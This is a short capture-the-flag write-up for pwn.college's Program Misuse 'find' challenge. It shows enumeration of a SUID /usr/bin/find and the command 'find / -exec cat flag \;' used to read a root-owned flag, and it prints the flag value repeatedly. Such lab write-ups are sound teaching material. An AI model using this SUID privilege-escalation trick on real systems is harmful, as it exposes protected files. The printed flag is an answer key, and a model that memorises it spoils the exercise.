---
layout: page
title: "Challenge Name: find"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/find`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/find
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/find
```

-The `s` in `-rws` indicates it's a SUID binary.
-`find` runs with **root privileges**.

## 🚀 Exploitation

The `find` command in Linux is used to search for files and directories in a directory hierarchy based on name, size, type, time, permissions, and many other filters — and optionally run commands on them.

Thus we can simply run commnds for a file using find just like `env`.

```bash
find / -exec cat flag \;
```

Output:
```
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
pwn.college{MdG7ObAboj4LhSlCpd_R5KIgJEK.ddjNxwSM0IzMyEzW}
```


